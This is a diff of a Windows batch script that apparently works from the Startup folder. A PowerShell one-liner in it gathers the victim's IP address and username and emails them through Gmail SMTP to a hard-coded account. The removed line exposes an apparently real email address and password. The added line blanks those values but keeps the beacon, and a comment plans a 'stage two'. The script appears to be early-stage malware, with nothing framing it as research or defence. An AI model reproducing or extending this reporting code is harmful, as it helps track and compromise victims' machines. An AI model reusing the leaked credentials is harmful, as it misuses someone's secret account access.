@@ -10,7 +10,7 @@ cd /d "%STARTUP%"
 
 
 @REM smtp
-powershell $email = "arashmehdizade.am@gmail.com"; $password = "123321Arash@"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);$smtp.Send($email, $email, $subject, $ip);
+powershell $email = ""; $password = ""; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);$smtp.Send($email, $email, $subject, $ip);
 
 
 @REM todo: build out stage two
